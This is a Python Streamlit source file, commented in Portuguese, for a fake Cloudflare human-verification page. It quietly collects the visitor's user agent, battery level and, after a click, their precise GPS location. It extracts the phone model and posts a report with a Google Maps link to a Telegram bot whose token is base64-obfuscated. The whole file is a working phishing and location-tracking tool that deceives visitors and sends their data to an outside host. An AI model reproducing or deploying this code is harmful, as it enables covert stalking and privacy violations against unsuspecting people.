import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Verifique se você é humano", page_icon="☁️", layout="centered")

# --- TOKEN E ID DO TELEGRAM ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- ESTILO CSS PARA FICAR IGUAL À CLOUDFLARE ---
st.markdown("""
    <style>
        /* Fundo e Texto */
        .stApp { background-color: #111111 !important; color: #eeeeee !important; }
        
        /* Título do Site */
        .site-header { font-family: -apple-system, sans-serif; font-size: 28px; font-weight: 500; margin-bottom: 8px; }
        
        /* Texto de instrução que você pediu */
        .desc-text { color: #aaaaaa; font-family: sans-serif; font-size: 15px; line-height: 1.5; margin-bottom: 25px; max-width: 450px; }
        
        /* A Caixa da Cloudflare */
        .cf-widget {
            border: 1px solid #333333;
            background-color: #191919;
            padding: 18px 24px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 480px;
            margin: 20px 0;
        }
        
        .cf-content { display: flex; align-items: center; gap: 15px; }
        
        /* O Checkbox Customizado */
        .checkbox-simulado {
            width: 28px;
            height: 28px;
            border: 2px solid #444444;
            border-radius: 4px;
            background-color: #222222;
        }
        
        .cf-logo { height: 24px; opacity: 0.8; }
        
        /* Rodapé */
        .footer-miamy { text-align: center; color: #444444; font-size: 12px; margin-top: 100px; font-weight: bold; }
    </style>
""", unsafe_allow_html=True)

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

# --- ESTADO DE VERIFICAÇÃO ---
if 'verificado' not in st.session_state:
    st.session_state['verificado'] = False

# --- INTERFACE ---
st.markdown('<div class="site-header">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)

st.markdown("""
<div class="desc-text">
    Este site utiliza um serviço de segurança para proteção contra bots maliciosos. 
    Esta página é exibida enquanto o site verifica se você não é um bot.
</div>
""", unsafe_allow_html=True)

# Coleta de dados silenciosa
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DATA")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DATA")

if not st.session_state['verificado']:
    # EXIBE A CAIXA PARA CLICAR
    st.markdown("""
    <div class="cf-widget">
        <div class="cf-content">
            <div class="checkbox-simulado"></div>
            <span style="font-size: 16px; font-family: sans-serif;">Verificando se você é humano...</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    """, unsafe_allow_html=True)

    if st.button("Verificar"):
        # Pede Localização no Clique do Botão
        js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true}); })"
        posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")

        if posicao and posicao != "erro":
            # Pega o modelo do celular
            modelo = "Smartphone"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    for p in info.split(";"):
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung", "2312"]):
                            modelo = p.strip()
                            break
                except: pass

            link = f"https://www.google.com/maps?q={posicao}"
            relatorio = (
                f"🛡️ *CLOUDFLARE PROTECT*\n"
                f"📱 *Aparelho:* {modelo}\n"
                f"🔋 *Bateria:* {bat if bat else '??'}%\n"
                f"📍 *Local:* {link}"
            )
            enviar_telegram(relatorio)
            st.session_state['verificado'] = True
            st.rerun()
else:
    # EXIBE O SUCESSO (Igual à sua segunda foto)
    st.markdown("""
    <div class="cf-widget" style="border-color: #10b981;">
        <div class="cf-content">
            <span style="color: #10b981; font-size: 24px;">✅</span>
            <span style="font-size: 16px; font-family: sans-serif; color: #10b981;">Verificação bem-sucedida.</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    <div class="desc-text" style="font-size: 14px;">Aguardando resposta do servidor principal...</div>
    """, unsafe_allow_html=True)

st.markdown('<div class="footer-miamy">Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
